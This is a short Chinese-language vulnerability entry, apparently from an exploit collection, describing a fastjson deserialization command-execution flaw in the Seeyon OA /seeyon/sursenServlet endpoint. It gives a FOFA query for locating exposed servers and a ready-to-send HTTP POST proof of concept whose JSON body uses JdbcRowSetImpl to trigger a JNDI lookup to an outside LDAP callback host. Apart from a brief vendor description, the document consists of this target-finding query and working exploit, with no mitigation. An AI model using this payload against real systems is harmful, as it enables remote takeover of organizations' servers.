## 致远OA-/seeyon/sursenServlet-命令执行漏洞

## 一、漏洞简介
北京致远互联软件股份有限公司成立于2002年，总部设立在北京，是一家始终专注于协同管理软件领域的高新技术企业，为客户提供专业的协同管理软件产品、解决方案、平台及云服务，是中国协同管理软件领域的开创者，致远OA/seeyon/sursenServlet存在fastjson反序列化漏洞，攻击者可通过该漏洞获取系统权限。

## fofa
```
app="致远互联-OA"
```

## POC
```
POST /seeyon/sursenServlet HTTP/1.1
Host: [目标服务器]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Connection: close
Content-Length: 195
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded

sursenData={"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://midx.callback.red","autoCommit":"true"}}
```
